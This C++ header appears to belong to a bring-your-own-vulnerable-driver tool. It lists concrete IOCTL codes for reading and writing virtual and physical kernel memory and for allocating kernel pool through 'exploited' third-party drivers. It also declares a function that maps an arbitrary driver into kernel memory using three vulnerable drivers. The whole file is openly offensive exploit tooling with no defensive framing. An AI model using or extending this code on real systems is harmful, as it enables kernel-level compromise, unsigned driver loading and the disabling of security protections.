#pragma once
#include <Windows.h>
#include <comdef.h>
#include <iostream>
#include "services.h"

// IOCTL status codes:
#define IOCTL_VIRTUAL_WRITE 0x9B0C1EC8
#define IOCTL_VIRTUAL_READ 0x9B0C1EC4
#define IOCTL_PHYSICAL_WRITE 0x9B0C1F44
#define IOCTL_PHYSICAL_READ 0x9B0C1F40
#define IOCTL_ALLOCATE_CONTIGUOUS 0x9B0C1EC0
#define IOCTL_ALLOCATE_KMPOOLPGSZ 0x22203C
#define IOCTL_FREE_KMPOOLPGSZ 0x222040
#define IOCTL_ALLOCATE_KMPOOLDYN 0x9C402FD4  // No free IOCTL - unloading module already deletes pool by default

// Defined sizes for headers/parameters/total size:
#define VIRTUAL_OPERATION_PARAMETERSIZE 0x18  // unused value + address + offset (buffer is the actual buffer in the specified size and not an address)
#define PHYSICAL_OPERATION_PARAMETERSIZE 0x10
#define ALLOCATE_CONTIGUOUS_OVERALLSIZE 0x30
#define ALLOCATE_KMPOOLDYN_OVERALLSIZE 0x8  // minimum

DWORD VirtualOperation(ULONG64 Address, ULONG64 Size, PVOID Buffer, BOOL IsRead, ExploitedDriver* DbuDriver);
DWORD PhysicalOperation(ULONG64 Address, ULONG64 Size, PVOID Buffer, BOOL IsRead, ExploitedDriver* DbuDriver);
DWORD AllocateContiguousMemory(ExploitedDriver* DbuDriver);
DWORD AllocatePageSizeKernelPool(ExploitedDriver* BsDriver);
DWORD FreePageSizeKernelPool(ExploitedDriver* BsDriver);
DWORD AllocateKernelPool(ExploitedDriver* LhaDriver);
BOOL MapDriverIntoMemory(char* DriverPath, ExploitedDriver* VulnDrivers[3]);